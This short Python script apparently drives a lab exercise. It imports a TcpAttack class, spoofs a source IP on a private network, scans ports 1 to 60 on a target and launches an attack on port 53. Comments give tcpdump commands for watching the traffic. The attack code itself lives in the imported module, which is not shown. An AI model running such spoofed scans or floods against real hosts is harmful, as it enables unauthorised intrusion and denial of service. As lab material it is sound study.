from TcpAttack import *
spoofIP = '192.168.1.137' # real ip is 192.168.1.139 
targetIP = '192.168.1.149'
rangeStart = 1
rangeEnd = 60
port = 53
Tcp = TcpAttack(spoofIP,targetIP)
Tcp.scanTarget(rangeStart,rangeEnd)

if Tcp.attackTarget(port,10):
   print("Port was open to attack")
else:
    print("Port is closed")

#commands to run
#sudo tcpdump -vvv -nn -i en0 -s 1500 -S -X 'dst 192.168.1.149' on attacker machine
#sudo tcpdump -vvv -nn -i en0 -s 1500 -S -X 'src 192.168.1.137' on attacked machine
# sudo python3 testScript.py on attacker machine 